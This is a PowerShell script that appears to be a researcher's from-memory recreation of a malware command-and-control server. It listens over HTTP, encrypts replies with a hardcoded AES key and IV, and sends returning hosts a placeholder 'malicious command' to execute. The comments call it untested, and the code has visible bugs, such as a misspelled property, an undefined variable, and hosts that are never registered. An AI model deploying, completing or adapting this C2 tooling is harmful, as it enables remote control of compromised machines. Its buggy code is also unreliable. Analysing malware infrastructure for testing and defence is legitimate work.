#This is completely untested, and it is 10000000000000% unknown if it works, but this is a "C2 server" for this script.  
# I also didn't reference the malicious code at all for this, but went from memory ~6hours later. So you can probably modify this
#To do what you want for testing purposes.
$http = [System.Net.HttpListener]::new()
$http.Prefixes.Add('http://localhost/')
$http.Start()
if ($http.isListenting){echo 'HTTP listening on ' + $http.Prefixes}
else{exit}
$hosts = @()
#Define malicious enc.
$encryptolator_obj = New-Object System.Security.Cryptography.AesManaged
$encryptolator_obj.Mode = [System.Security.Cryptography.CipherMode]::CBC
$encryptolator_obj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$encryptolator_obj.BlockSize = 128
$encryptolator_obj.KeySize = 256
[byte[]]$enc_key = 23, 29, 132, 232, 65, 174, 228, 192, 255, 251, 162, 124, 134, 209, 236, 130, 184, 128, 124, 184, 195, 121, 154, 17, 184, 250, 45, 183, 120, 31, 209, 90
[byte[]]$enc_IV = 24, 60, 237, 111, 179, 52, 159, 154, 198, 249, 8, 249, 41, 222, 53, 82
$the_Encryptor = $encryptolator_obj.CreateEncryptor($enc_key, $enc_IV)
$the_Decryptor = $encryptolator_obj.CreateDecryptor($enc_key, $enc_IV)
$cmdline=''
#Actually listen for hosts.
while ($http.isListening){
    $context = $http.GetContext()
    if ($context.Request.HttpMethod -eq 'GET'){
        $hostaddr= $context.Request.UserHostAddress
        echo $hostname + ' connected'
        if ($hosts.contains($hostaddr)){
            #FILL HERE FOR CMD TO EXE ON HOST
            $Malicious_cmd = ''
            #FILL HERE FOR CMD TO EXE ON HOST
            $cmdline = $the_Encryptor.TransformFinalBlock($Malicious_cmd,0,$Malicious_cmd.Length) 
        }
        else{
            $cmdline = $the_Encryptor.TransformFinalBlock(([string]$hosts.Length),0,([string]$hosts.Length).Length)

        }

        $buffer = [System.Text.Encoding]::UTF8.GetBytes($cmdline) 
        $context.Response.ContentLength64 = $buffer.Length
        $context.Response.OutputStream.Write($buffer, 0, $buffer.Length) 
        $context.Response.OutputStream.Close()
    }
}
